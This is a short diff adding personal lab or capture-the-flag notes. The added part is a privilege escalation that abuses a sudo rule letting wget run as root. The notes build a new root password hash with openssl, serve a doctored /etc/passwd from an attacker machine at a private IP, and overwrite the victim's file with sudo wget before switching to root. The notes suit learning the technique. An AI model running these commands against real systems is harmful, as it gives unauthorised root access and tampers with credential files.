@@ -34,3 +34,23 @@ jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
 Potential usernames 
 
 Jessie
+
+
+**victim:**
+sudo -l
+> can run wget as root
+copy /etc/passwd to /tmp
+download it
+
+**my_machine**:
+openssl passwd -1 "NewRootPassword"
+> i get a hash
+> i replace that hash in the passwd root, where the "x" was
+> python -m http.server 8080
+
+
+**victim**:
+sudo /usr/bin/wget http://192.168.232.84:8080/passwd -O /etc/passwd
+su root
+NewRootPassword
+
